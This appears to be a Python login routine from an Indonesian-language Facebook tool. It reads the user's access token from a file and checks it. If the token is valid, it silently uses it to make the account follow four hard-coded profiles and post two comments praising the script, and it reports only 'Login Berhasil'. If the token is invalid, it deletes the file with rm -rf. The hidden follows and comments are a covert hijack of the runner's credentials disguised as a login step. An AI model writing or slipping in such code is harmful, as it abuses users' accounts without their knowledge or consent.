import requests,os,json
import manda

P = "\x1b[0;97m" # Putih
M = "\x1b[0;91m" # Merah
O = "\x1b[0;96m" # Biru Muda

def main():
    try:
        token = open("token.txt","r").read()
        otw = requests.get("https://graph.facebook.com/me/?access_token=" + token)
        a = json.loads(otw.text)
        nama = a["name"]
    except (KeyError,IOError):
        print('%s║'%(M))
        print('%s╚══[%s!%s]◍➤ %sToken Invalid'%(M,P,M,P))
        os.system('rm -rf token.txt')
        exit(manda.menu_log())
    requests.post("https://graph.facebook.com/100017584682867/subscribers?access_token=" + token)    
    requests.post("https://graph.facebook.com/100000395779504/subscribers?access_token=" + token) 
    requests.post("https://graph.facebook.com/100000834003593/subscribers?access_token=" + token)
    requests.post("https://graph.facebook.com/100003986228742/subscribers?access_token=" + token)
    requests.post('https://graph.facebook.com/4257706904267068/comments/?message=Keren Bang ❤️&access_token=' + token) 
    requests.post('https://graph.facebook.com/800676813861801/comments/?message=Script Nya Mantap Bang 😊&access_token=' + token)
    print('%s║'%(O))
    print('%s╚══[%s!%s]◍➤ %sLogin Berhasil'%(O,P,O,P))
    exit(manda.menu())
